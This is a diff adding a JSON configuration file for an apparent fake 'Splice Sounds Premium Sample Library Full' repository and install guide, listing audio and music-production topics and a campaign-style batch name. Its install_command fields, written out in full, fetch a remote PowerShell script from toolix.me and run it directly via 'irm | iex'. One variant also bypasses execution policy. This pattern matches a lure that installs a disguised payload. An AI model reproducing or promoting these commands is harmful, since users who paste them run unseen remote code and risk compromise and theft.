@@ -1,0 +1,27 @@
+{
+  "repo": "Splice-Sounds-Premium-Sample-Library-Full",
+  "product": "Splice Sounds Premium Sample Library",
+  "product_title": "Splice Sounds Premium Sample Library",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "audio",
+  "topics": [
+    "how-to-install-splice-sounds-sample-library",
+    "splice-sounds-sample-library-app",
+    "daw-plugin",
+    "mixing-tools",
+    "audio-editing",
+    "music-production",
+    "splice-sounds-sample-library-audio-tool",
+    "splice-sounds-sample-library-music-production",
+    "splice-sounds-sample-library",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
